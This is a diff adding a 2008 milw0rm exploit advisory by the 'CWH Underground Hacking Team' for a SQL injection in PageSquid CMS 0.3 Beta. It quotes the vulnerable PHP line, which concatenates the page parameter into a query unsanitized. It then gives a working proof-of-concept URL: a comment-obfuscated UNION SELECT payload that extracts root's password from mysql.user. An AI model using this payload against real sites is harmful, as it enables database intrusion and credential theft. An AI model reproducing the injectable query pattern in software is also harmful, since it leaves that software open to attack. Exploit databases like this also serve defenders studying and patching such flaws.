@@ -1,0 +1,62 @@
+=====================================================================
+  PageSquid CMS (index.php page) Remote SQL Injection Vulnerability
+=====================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 22 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : PageSquid CMS
+ VERSION     : 0.3 Beta
+ DOWNLOAD    : http://downloads.sourceforge.net/pagesquid
+#####################################################
+
+--- Remote SQL Injection Exploit ---
+
+**Magic_quote must turn off**
+
+-----------------------------------
+ Vulnerable File [index.php?page=]
+-----------------------------------
+
+@Line 5
+
+   4:  if (isset($_GET['page'])) {
+   5:		$result = mysql_fetch_array(mysql_query("SELECT  * FROM pages WHERE page_id='" . $_GET['page'] . "'"));
+   6:  } else {
+   7:		$result = mysql_fetch_array(mysql_query("SELECT  * FROM pages WHERE page_order='1'"));
+   8:  }
+
+---------
+ Exploit
+---------
+[+] http://[Target]/[pagesquid_path]/index.php?page=[SQL Injection]
+
+
+-------------
+ POC Exploit
+-------------
+
+[+] http://192.168.24.25/pagesquid/index.php?page=3'/**/AND/**/1=2/**/UNION/**/SELECT/**/1,Password,3,4/**/FROM/**/mysql.user/**/WHERE/**/User='root
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-22]
